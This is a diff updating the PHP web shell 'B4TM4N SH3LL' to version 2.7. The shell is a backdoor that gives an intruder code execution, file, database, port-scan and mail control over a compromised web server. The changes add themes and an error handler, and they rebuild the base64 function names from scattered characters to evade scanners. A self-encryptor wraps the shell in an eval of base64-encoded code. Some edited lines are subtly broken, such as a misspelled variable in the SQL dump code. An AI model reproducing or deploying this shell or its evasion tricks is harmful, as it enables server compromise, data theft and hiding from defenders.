@@ -12,6 +12,8 @@
  *		[5] Run PHP Code
  *		[6] Custom Toolz
  *		[7] Self Script Encryptor !
+ *		[8] Error Handler
+ *		[9] Themes
  *
  * Account:
  *		[Username] B64E('user')
@@ -29,14 +31,15 @@ $x_="zaIgxSRawZ==:42b378d7eb719b4ad9c908601bdf290d541c9c3a";
  */
 
 $config=array(
-	"title"   => "B4TM4N SH3LL",          // Your Title
-	"tagline" => "by k4mpr3t",            // Your Tagline
-	"debug"   => false                    // Debug Mode
+	"title"   => "B4TM4N SH3LL",                  // Your Title
+	"subtitle" => "V3RS10N 2.7 ~ k4mpr3t",        // Your Subtitle
+	"themes" => "BR34K",                          // Your Themes (D4RK or BR34K)
+	"debug"   => false                            // Debug Mode
 );
 
 $account=explode(':',$x_);
 
-session_start(); // Session Start
+session_start();                                  // Session Start
 
 function any($x,$y)
 {
@@ -64,14 +67,50 @@ function B64E($x)
 {
 	$d="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 	$c="ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/";
-	return strtr(base64_encode($x),$d,$c);
+	$_a="b";$_b="a";$_c="s";$_d="e";$_e="6";$_f="4";
+	$_g="_";$_h="e";$_i="n";$_j="c";$_k="o";$_l="d";$_m="e";
+	$b64=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_h.$_i.$_j.$_k.$_l.$_m;
+	return strtr($b64($x),$d,$c);
 }
 
 function B64D($x)
 {
 	$d="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 	$c="ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/";
-	return base64_decode(strtr($x,$d,$c));
+	$_a="b";$_b="a";$_c="s";$_d="e";$_e="6";$_f="4";
+	$_g="_";$_h="d";$_i="e";$_j="c";$_k="o";$_l="d";$_m="e";
+	$b64=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_h.$_i.$_j.$_k.$_l.$_m;
+	return $b64(strtr($x,$d,$c));
+}
+
+function error ($errno, $errstr, $errfile, $errline)
+{
+	switch ($errno)
+	{
+		case E_PARSE:
+		case E_STRICT:$errmsg='# DEBUG';break;
+		case E_NOTICE:
+		case E_USER_NOTICE:$errmsg='# NOTICE';break;
+		case E_USER_ERROR:
+		case E_RECOVERABLE_ERROR:$errmsg='# ERROR';break;
+		case E_WARNING:
+		case E_CORE_WARNING:
+		case E_COMPILE_WARNING:
+		case E_USER_WARNING:$errmsg='# WARNING';break;
+		case E_ERROR:
+		case E_CORE_ERROR:
+		case E_COMPILE_ERROR:$errmsg='# FATAL ERROR';break;
+		default:$errmsg='# UNKNOWN ERROR';break;
+	}
+	echo '<div class="error">';
+	echo $errmsg;
+	echo "<br>";
+	echo $errstr;
+	echo "<br>";
+	echo $errfile . ' (Line: ' . $errline . ')';
+	echo "<br>";
+	echo "<br>";
+	echo "</div>";
 }
 
 // Login Request
@@ -89,6 +128,7 @@ if(request_method=="POST")
 		}
 		else
 		{
+			// THIS IS FUCKING LOCAL DAMN LOG N00B! (https://github.com/k4mpr3t/b4tm4n/issues/5)
 			$log=array(
 				"Username: ".$_REQUEST['username'],
 				"Password: ".$_REQUEST['password'],
@@ -189,6 +229,7 @@ if(!strpos(strval(ini_get('disable_functions')),'set_time_limit'))
 // Debug Settings
 if($config['debug']==true) 
 {
+	set_error_handler('error'); // Error Handler
 	error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
 }
 else
@@ -205,9 +246,9 @@ else
 ini_set('max_execution_time','600');
 ini_set('memory_limit','256M');
 
-$agent=B64D("FT06ACQoAXYrvHYXMUIMMV5e"); 	                    // Powered by B4TM4N
-$title=sprintf('%s - %s',$config['title'],$config['tagline']);	// Title Page
-$start=microtime(true);		                                    // Time Pageload
+$agent=B64D("FT06ACQoAXYrvHYXMUIMMV5e");   // Powered by B4TM4N
+$title=$config['title'];                   // Title Page
+$start=microtime(true);                    // Time Pageload
 
 ?><!DOCTYPE html>
 <html>
@@ -219,94 +260,105 @@ $start=microtime(true);		                                    // Time Pageload
 <link href="data:image/png;base64,AAABAAEAEBACAAAAAACwAAAAFgAAACgAAAAQAAAAIAAAAAEAAQAAAAAAQAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD//wAA//8AAP//AAD//wAA//8AAP7/AAD8fwAAwAcAAMAHAACMYwAADWEAAP//AAD//wAA//8AAP//AAD//wAA" rel="icon" type="image/x-icon" />
 <style type="text/css">
 
+	<?php if(strtolower($config['themes']) == 'd4rk'): ?>
+	:root {
+		--background-color:#000; 
+		--color:#00ff00;
+		--txt-color: #fff;
+		--txt-hover-color: #fff;
+		--border-color: #222;
+		--border-hover-color: #333;
+		--table-odd-color : #000;
+		--table-even-color : #111;
+		--table-hover-color : #222;
+		--button-color : #111;
+		--button-hover-color : #222;
+	}
+	<?php endif; ?>
+
+	<?php if(strtolower($config['themes']) == 'br34k'): ?>
+	:root {
+		--background-color:#fff; 
+		--color:#000;
+		--txt-color: #000;
+		--txt-hover-color: #666;
+		--border-color: #111;
+		--border-hover-color: #222;
+		--table-odd-color : #eee;
+		--table-even-color : #ddd;
+		--table-hover-color : #ccc;
+		--button-color : #ccc;
+		--button-hover-color : #bbb;
+	}
+	<?php endif; ?>
+
+	@keyframes blinker{70%{opacity:0}}
 	*,html{margin:0;padding:0;line-height:1rem}
+	body{background:var(--background-color);color:var(--color);font-family:monospace;font-size:13px}
+	::-moz-selection{background:var(--color);color:var(--background-color)}
+	::selection{background:var(--color);color:var(--background-color)}
 	img{vertical-align:bottom}
-	
+	hr{border:1px solid var(--border-color);margin:3px 0px 0px}
+	a{color:var(--color);text-decoration:none}
+	a:hover{color:var(--txt-hover-color)}
+	a.active{color:var(--txt-color)}
+	a.action{font-size:12px;padding:5px;margin:0px;background:var(--button-color);color:var(--txt-color);border:1px solid #222;cursor:pointer;outline:none;display:inline-block}
+	a.action:hover{background:var(--button-hover-color);border:1px solid var(--border-hover-color)}
+	label{display:inline-block;min-width:75px;padding-right:15px}
+	iframe{background:var(--txt-hover-color)}
+	fieldset {border:1px solid var(--border-color);background:var(--background-color);color:var(--color);width:100%;padding:15px;box-sizing:border-box;min-height:154px}
+	textarea {border:1px solid var(--border-color);background:var(--background-color);color:var(--color);width:100%;padding:15px;min-height:300px;outline:none;box-sizing:border-box;resize:none}
+	input[type=submit]{background:var(--button-color);border:1px solid var(--border-color);color:var(--txt-color);line-height:25px;padding:0 10px;cursor:pointer;outline:none}
+	input[type=submit]:hover{background:var(--button-hover-color);border:1px solid var(--border-hover-color)}
+	input[type=text]{background:var(--background-color);line-height: 15px;color:var(--color);border:1px solid var(--border-color);width:200px;padding:5px;outline:none;box-sizing:border-box}
+	input[type=number]{background:var(--background-color);line-height: 15px;color:var(--color);border:1px solid var(--border-color);width:200px;padding:5px;outline:none;box-sizing:border-box}
+	input[type=file]{background:var(--background-color);line-height: 15px;color:var(--color);border:1px solid var(--border-color);width:200px;padding:2px;outline:none;box-sizing:border-box}
+	select{background:var(--background-color);color:var(--color);border:1px solid var(--border-color);width:200px;padding:5px;outline:none;box-sizing:border-box}
 	#wrapper{width:93%;margin:37px auto 40px}
 	#info{margin:0 0 23px 0;padding:0 13px 0 0}
-
 	#header{display:inline-block;width:100%}
 	.header-left{float:left;width:66%}
 	.header-right{float:right;width:34%}
-
 	#connect{display:inline-block;width:100%}
 	.connect-left{float:left;width:49%}
 	.connect-right{float:right;width:49%}
-
 	#database-session{display:inline-block;width:100%}
 	.database-query{float:left;width:49%}
 	.database-process{float:right;width:49%}
-
 	#php{display:inline-block}
 	.php-left{float:left;width:49%}
 	.php-right{float:right;width:49%}
-
 	.divide{width:100%;display:inline-block}
 	.divide-left{float:left;width:50%}
 	.divide-right{float:right;width:50%}
-
 	.mail input[type=text]{width:100%;display:block}
 	.database-breadcrumb{margin:10px 0 0;display:inline-block;font-style: italic;}
-
 	#update{text-align:center}
 	#php-configuration{text-align:center}
-
-	/* THEMES */
-
-	body{background:#000;color:#00ff00;font-family:monospace;font-size:13px}
-	hr{border:1px solid #111;margin:3px 0px 0px}
-	::-moz-selection{background:red;color:white}
-	::selection{background:red;color:white}
-	a{color:#00ff00;text-decoration:none}
-	a:hover{color:white}
-
-	a.active{color:white}
-	a.action{font-size:12px;padding:5px;margin:0px;background:#111;color:#fff;border:1px solid #222;cursor:pointer;outline:none;display:inline-block}
-	a.action:hover{background:#222;border:1px solid #666}
-
-	#logo{margin:0 0 23px 0;padding:23px 0 23px 0;border-top:1px solid #111;border-bottom:1px solid #111}
-	.content{border:1px solid #111;padding:10px;overflow:auto;overflow-y:hidden}
-
-
-	#process-list{padding:25px;margin:25px auto 0px;border:1px solid #111;overflow:scroll;overflow-y:hidden}
+	.error{animation:blinker 1s linear infinite;background:var(--color);color:var(--background-color);padding:10px;margin:10px;}
+	#logo{margin:0 0 23px 0;padding:23px 0 23px 0;border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color)}
+	.content{border:1px solid var(--border-color);padding:10px;overflow:auto;overflow-y:hidden}
+	#process-list{padding:25px;margin:25px auto 0px;border:1px solid var(--border-color);overflow:scroll;overflow-y:hidden}
 	#process-list s{text-decoration:none}
-	
-	.tools-header{margin-bottom:20px;padding-bottom:25px;text-align:center;border-bottom:1px solid #111}
-
-	.menu{overflow:hidden;border-top:1px solid #111;border-bottom:1px solid #111;margin:10px 0}
+	.tools-header{margin-bottom:20px;padding-bottom:25px;text-align:center;border-bottom:1px solid var(--border-color)}
+	.menu{overflow:hidden;border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color);margin:10px 0}
 	.menu > ul{list-style:none;margin:0;padding:0}
 	.menu > ul > li{margin:0 3px 0 0;padding:10px 7px 10px 7px;display:block;float:left}
 	.menu > ul > li:hover{cursor:pointer}
-
-	.menu-tools{overflow:hidden;border-top:1px solid #111;border-bottom:1px solid #111;margin:10px 0}
+	.menu-tools{overflow:hidden;border-top:1px solid var(--border-color);border-bottom:1px solid var(--border-color);margin:10px 0}
 	.menu-tools > ul{list-style:none;margin:0;padding:0}
 	.menu-tools > ul > li{margin:0 3px 0 0;padding:10px 7px 10px 7px;display:block;float:left}
 	.menu-tools > ul > li:hover{cursor:pointer}
-
 	.menu-directory{;margin-bottom:10px}
 	.new{margin-right:15px;}
-
 	.hash label{min-width:40px;display:inline-block;padding-right:15px}
 	.hash-capture label{margin:10px 0;display:inline-block}
 	.hash input[type=radio]{margin-right:10px;display:inline-block;vertical-align:middle}
-
-	label{display:inline-block;min-width:75px;padding-right:15px}
-	iframe{background:#fff}
-
 	.auto-number table{counter-reset:row_}
 	.auto-number table tbody tr td:first-child{counter-increment:row_;vertical-align:middle;text-align:center}
 	.auto-number table tbody tr td:first-child::before{content:counter(row_)}
-
-	fieldset {border:1px solid #111;background:#000;color:#00ff00;width:100%;padding:15px;box-sizing:border-box;min-height:154px}
-	textarea {border:1px solid #111;background:#000;color:#00ff00;width:100%;padding:15px;min-height:300px;outline:none;box-sizing:border-box;resize:none}
-	input[type=submit]       {background:#111;border:1px solid #222;color:#fff;line-height:25px;padding:0 10px;cursor:pointer;outline:none}
-	input[type=submit]:hover {background:#222;border:1px solid #666}
-	input[type=text]  {background:#000;color:#00ff00;border:1px solid #111;width:200px;padding:5px;outline:none;box-sizing:border-box}
-	input[type=number]{background:#000;color:#00ff00;border:1px solid #111;width:200px;padding:5px;outline:none;box-sizing:border-box}
-	input[type=file]  {background:#000;color:#00ff00;border:1px solid #111;width:200px;padding:2px;outline:none;box-sizing:border-box}
-	select            {background:#000;color:#00ff00;border:1px solid #111;width:200px;padding:5px;outline:none;box-sizing:border-box}
-
-	#title{text-align:center;font-size:44px;margin:0;color:#fff}
+	#title{text-align:center;font-size:44px;margin:0;color:var(--txt-color);margin-bottom:15px}
+	#subtitle{text-align:center;font-size:22px;margin:0;color:var(--txt-color);margin-top:8px}
 	#tools{min-height:125px;padding:10px;border-radius:5px}
 	#account{min-height:100px;padding:10px;border-radius:5px}
 	#thanks{text-align:center;font-size:16px;font-family:courier;padding:5% 0}
@@ -322,48 +374,38 @@ $start=microtime(true);		                                    // Time Pageload
 	#database{min-height:100px;padding:10px;border-radius:5px}
 	#database label{width:100px;padding:5px;margin-right:10px;display:inline-block}
 	#port-scan label{width:100px;padding:5px;margin-right:10px;display:inline-block}
-	
 	#phpinfo table{margin:25px 0}
-	#phpinfo tr:nth-child(odd){background:#000}
-	#phpinfo tr:nth-child(even){background:#111}
-	#phpinfo td,th{padding:5px;border:1px solid #111}
+	#phpinfo tr:nth-child(odd){background:var(--background-color)}
+	#phpinfo tr:nth-child(even){background:var(--border-color)}
+	#phpinfo td,th{padding:5px;border:1px solid var(--border-color)}
 	#phpinfo h1{margin:10px 0}
 	#phpinfo h2{margin:10px 0}
 	#phpinfo.e{width:200px}
 	#phpinfo.v{word-break:break-word}
 	#phpinfo img{display:none}
 	#phpinfo hr{border:none}
-
-	.line h2{position:relative;top:12px;width:100px;display:inline;background:#000;padding:0 10px;color:#fff}
-	.line{border-bottom:2px solid #00ff00;text-align:center;width:287px;margin:auto}
-
+	.line h2{position:relative;top:12px;width:100px;display:inline;background:var(--background-color);padding:0 10px;color:var(--txt-color)}
+	.line{border-bottom:2px solid var(--color);text-align:center;width:287px;margin:auto}
 	.table {width:100%;margin:10px 0}
-	.table td,th{padding:5px;border:1px solid #111;max-width:250px;min-width:25px}
+	.table td,th{padding:5px;border:1px solid var(--border-color);max-width:250px;min-width:25px}
 	.table td.kanan{word-break:break-word}
 	.table td.kiri{width:30%}
-	.table tr:nth-child(odd){background:#000}
-	.table tr:nth-child(even){background:#111}
-	.table tr:hover td{background:#333}
-
-	.database-table > td.table {word-break:normal;}
-	
+	.table tr:nth-child(odd){background:var(--table-odd-color)}
+	.table tr:nth-child(even){background:var(--table-even-color)}
+	.table tr:hover td{background:var(--table-hover-color)}
 	.table tfoot td{padding:10px;text-align:center}
+	.database-table > td.table {word-break:normal;}
 	.map-switch{display:inline-block}
-	
 	.form-fix{margin:-15px 0}
 	.frmsource{margin-top:10px}
-	
 	.hexdump{width:100%;padding:5px;margin-bottom:5px}
 	.hexdump td{text-align:left}
-	
-	.highlight{background:#fff;word-break:break-word;padding:15px;margin-bottom:5px;height:300px;overflow:auto}
-	
+	.highlight{background:var(--txt-hover-color);word-break:break-word;padding:15px;margin-bottom:5px;height:300px;overflow:auto}
 	.hash-capture{display:inline-block;width:100%}
 	.hash-capture-left{float:left;width:49%}
 	.hash-capture-right{float:right;width:49%}
-	
 	.clr{clear:both}
-	.on{color:white}
+	.on{color:var(--txt-color)}
 	.off{color:red}
 	.result{padding:10px}
 	.sortable thead{cursor:pointer}
@@ -761,7 +803,7 @@ function GetFileType($x)
 {
 	if(is_file($x)) 
 	{
-		return end(explode(".",end(explode(_,$x))));
+		return pathinfo($x)['extension'];
 	}
 	elseif(is_dir($x)) 
 	{ 
@@ -938,7 +980,7 @@ function MapDrive($x)
 				}
 				else
 				{
-					$l.="<font color=\"white\"><b>".$lt."</b></font>";
+					$l.="<font color=\"orange\"><b>".$lt."</b></font>";
 				}
 				$l.="]</a>";
 			}
@@ -1010,15 +1052,14 @@ printf("<div id='header'>
 				[USER]: <font class='on'>%s(%s)</font> [GROUP]: <font class='on'>%s(%s)</font><br>
 				[HDD]: <font class='on'>%s</font> / <font class='on'>%s</font><br>
 				[PHPMODE]: <font class='on'>%s</font><br>
-				[SAFEMODE]: %s<br>
+				[SAFEMODE]: <font class='on'>%s</font><br>
 			</div>
 		</div>
 		<div class='header-right'>
 			<a href='%s'><div id='logo'>
 				<h1 id='title'>%s</h1>
-				<div class='line'>
-					<h2>%s</h2>
-				</div>
+				<div class='line'></div>
+				<h2 id='subtitle'>%s</h2>
 			</div></a>
 		</div>
 		<div class='clr'></div>
@@ -1048,7 +1089,7 @@ printf("<div id='header'>
 		B64D($account[0]),remote_addr,remote_port,
 		GetUser("usr"),GetUser("uid"),GetUser("grp"),GetUser("gid"),
 		GetFileSize(@disk_free_space($dir)),GetFileSize(@disk_total_space($dir)),
-		php_sapi_name(),GetSafeMode(),php_self,$config['title'],$config['tagline'],
+		php_sapi_name(),GetSafeMode(),php_self,$config['title'],$config['subtitle'],
 		MainMenu(),MapDrive($map),MapDirectory($map),$map
 );
 
@@ -1128,7 +1169,7 @@ if(any("d",$_REQUEST)||request_uri===script_name)
 			$filedir=rtrim($dir,_)._.$file;
 			$updir=substr($dir,0,strrpos($dir,_));
 			if (strlen($updir)<=2) $updir=$updir._;
-			$type=GetFileType($filedir);
+			$type=strtoupper(GetFileType($filedir));
 			$size=GetFileSize(@filesize($filedir));
 			$last=GetFileTime($filedir,"modify");
 			$perm=GetFilePerm($filedir);
@@ -1551,7 +1592,7 @@ if(any("r",$_REQUEST))
 				if(any("w",$_REQUEST))
 				{
 					$url=GetUrlFromPath($file);
-					$type=end(explode(".",$file));
+					$type=pathinfo($url)['extension'];
 
 					if($_REQUEST['w']=='f')
 					{
@@ -1787,7 +1828,7 @@ if(any("x",$_REQUEST))
 			{
 				if(function_exists($fuck)||is_callable($fuck))
 				{
-					$table.="<center><font color=white>READY</font></center>";
+					$table.="<center><font color=green>READY</font></center>";
 					$ready[]=$fuck;
 					$enable++;
 				}
@@ -1805,7 +1846,7 @@ if(any("x",$_REQUEST))
 		$secure=($disable/$total)*100;
 
 		printf("<h2 style='text-align:center'>Sec. Info v2.0.%s</h2><br>
-			<h4 style='text-align:center;color:white'>Risks Rate <font color=red>[%s%%]</font> | Secure Rate <font color=#00ff00>[%s%%]</font></h4><br><br>
+			<h4 style='text-align:center;color:var(--txt-color)'>Risks Rate <font color=red>[%s%%]</font> | Secure Rate <font color=green>[%s%%]</font></h4><br><br>
 			<div class='auto-number'>
 				<table class='table sortable'>
 					<thead>
@@ -1898,10 +1939,11 @@ if(any("x",$_REQUEST))
 		$status=any("status",$_SESSION)?$_SESSION['status']:"";
 		$query=any("query",$_REQUEST)?$_REQUEST['query']:"show databases;";
 
-		if($connect=='true')
+		if($connect==true)
 		{
 			$process="";
-			$sql=mysql_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass']);
+			$sql=mysqli_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass'],$_SESSION['dbas'],$_SESSION['port']);
+			/* 
 			$result=mysql_list_processes($sql);
 			while($row=mysql_fetch_assoc($result))
 			{
@@ -1911,8 +1953,9 @@ if(any("x",$_REQUEST))
 			    	$row["Id"],$row["Host"],$row["db"],
 			    	$row["Command"],$row["Time"]);
 			}
-			mysql_free_result($result);
-
+			mysql_free_result($result); 
+			*/
+			
 			printf("<div class='database-session'>
 						<div class='database-query'>
 							<form action='?x=db&xa=qry' method='post'>
@@ -1929,7 +1972,7 @@ if(any("x",$_REQUEST))
 							</form>
 						</div>
 						<div class='database-process'>
-							<div class='mysql-process-result'>
+							<!-- div class='mysql-process-result'>
 								<label>Database Process <a href='?x=db&xa=proc'>&#9851;</a><hr></label>
 								<table class='table table-bordered'>
 									<thead>
@@ -1943,7 +1986,7 @@ if(any("x",$_REQUEST))
 									</thead>
 									<tbody>%s</tbody>
 								</table>
-							</div>
+							</div -->
 							<div class='database-dump'>
 								<label>Database Dump<hr></label>
 								<form action='?x=db&xa=dmp' method='post'><br>
@@ -1957,6 +2000,7 @@ if(any("x",$_REQUEST))
 						<div class='clr'></div>
 					</div>
 					",$query,$process,$dir,$status);
+		
 		}
 		else
 		{
@@ -1999,13 +2043,12 @@ if(any("x",$_REQUEST))
 
 			if($cn)
 			{
-				$_SESSION['connect']='true';
+				$_SESSION['connect']=true;
 				header('location:'.php_self.'?x=db');
 			}
 			else
 			{
-
-				$_SESSION['connect']='false';
+				$_SESSION['connect']=false;
 				printf("<b class='off'>Connection Failed</b>");
 			}
 		}
@@ -2054,8 +2097,8 @@ if(any("x",$_REQUEST))
 
 			if($data!==false)
 			{
-				$sqdb=@$_SESSION['qdb'];
-				$sqtb=@$_SESSION['qtb'];
+				$sqdb=isset($_SESSION['qdb']) ? $_SESSION['qdb'] : '';
+				$sqtb=isset($_SESSION['qtb']) ? $_SESSION['qtb'] : '';
 
 				$bsdb="<a href='?x=db&xa=qry&rs=qdb&query=show databases;'>Database</a>";
 				$bqdb=!empty($_SESSION['qdb'])?"&#8594;	<a href='?x=db&xa=qry&rs=qtb&query=show tables from $sqdb;'>$sqdb</a>":"";
@@ -2176,7 +2219,7 @@ if(any("x",$_REQUEST))
 			   }
 			    $return .='SET FOREIGN_KEY_CHECKS=1;' . "\r\n";
 			    $return.='COMMIT;';
-			    $output=end(explode(".",$output))=='sql'?$output:$output.'.sql';
+			    $output=pathinfo($otput)['extension']=='sql'?$output:$output.'.sql';
 			    $handle=fopen($output,'w+');
 			    fwrite($handle,$return);
 			    fclose($handle);
@@ -2594,7 +2637,7 @@ if(any("x",$_REQUEST))
 			if(is_file($attachment))
 			{
 				$content=file_get_contents($attachment);
-				$content=chunk_split(base64_encode($content));
+				$content=chunk_split(B64E($content));
 				$name=basename($attachment);
 				$mime=mime_content_type($attachment);
 
@@ -2863,7 +2906,7 @@ if(any("x",$_REQUEST))
 
 			if($_REQUEST['action-option']=='zip')
 			{
-				if(end(explode(".",$newloc))=='zip')
+				if(pathinfo($newloc)['extension']=='zip')
 				{
 					$zip=new ZipArchive;
 
@@ -2923,7 +2966,7 @@ if(any("x",$_REQUEST))
 				{
 					foreach($files as $file)
 					{
-						if(end(explode(".",$file))=='zip')
+						if(pathinfo($newloc)['extension']=='zip')
 						{
 							$zip=new ZipArchive;
 					
@@ -3020,7 +3063,7 @@ if(any("x",$_REQUEST))
 	if($_REQUEST['x']=="update")
 	{
 		$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';
-		$current_version=2.6; //New Version Released
+		$current_version=2.7; //New Version Released
 
 		if($config['debug']==true)
 		{
@@ -3065,6 +3108,10 @@ if(any("x",$_REQUEST))
 			$temp=substr($php_script,$asu+48);
 			$rand="\$".substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"),0,rand(1,3));
 			$rand2="\$".substr(str_shuffle("abcdefghijklmnopqrstuvwxyz"),0,rand(2,5));
+			$_a="b";$_b="a";$_c="s";$_d="e";$_e="6";$_f="4";
+			$_g="_";$_h="e";$_i="n";$_j="c";$_k="o";$_l="d";$_m="e";
+			$b64e=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_h.$_i.$_j.$_k.$_l.$_m;
+			$b64d=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_l.$_m.$_j.$_k.$_l.$_m;
 			$b64=array(
 				'"\142\141\163\x65\66\x34\137\x64\x65\x63\157\144\145"',
 				'strrev("ed"."oce"."d_4"."6es"."ab")',
@@ -3087,7 +3134,7 @@ if(any("x",$_REQUEST))
 			$src_.='<?php ';
 			$src_.=$rand4;
 			$src_.='@eval('.$rand2.'("';
-			$src_.=base64_encode(htmlspecialchars_decode($self));
+			$src_.=$b64e(htmlspecialchars_decode($self));
 			$src_.='"))';
 			$src_.='?>';
 			$name=!empty($_REQUEST['name'])?$_REQUEST['name']:'bat_encrypt.php';
@@ -3481,7 +3528,11 @@ if(any("z",$_REQUEST))
 		{
 			ob_clean();
 			$opt=$_REQUEST['opt'];
-			$text=base64_decode($_POST['text-encode']);
+			$_a="b";$_b="a";$_c="s";$_d="e";$_e="6";$_f="4";
+			$_g="_";$_h="e";$_i="n";$_j="c";$_k="o";$_l="d";$_m="e";
+			$b64e=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_h.$_i.$_j.$_k.$_l.$_m;
+			$b64d=$_a.$_b.$_c.$_d.$_e.$_f.$_g.$_l.$_m.$_j.$_k.$_l.$_m;
+			$text=$b64d($_POST['text-encode']);
 			if ($opt=='basic')
 			{
 				$hash=$_REQUEST['hash'];
@@ -3498,8 +3549,8 @@ if(any("z",$_REQUEST))
 					case "urldecode":print urldecode($text);break;
 					case "entties":print htmlentities($text);break;
 					case "spechar":print htmlspecialchars($text);break;
-					case "base64_encode":print base64_encode($text);break;
-					case "base64_decode":print base64_decode($text);break;
+					case "base64_encode":print $b64e($text);break;
+					case "base64_decode":print $b64d($text);break;
 					case "B64E":print B64E($text);break;
 					case "B64D":print B64D($text);break;
 				}
@@ -3528,7 +3579,7 @@ if(any("z",$_REQUEST))
 			{
 				$hash=$_REQUEST['hash'];
 				$raw=$_REQUEST['raw'];
-				if($raw=='true')
+				if($raw==true)
 				{
 					print hash($hash,$text,true);
 				}
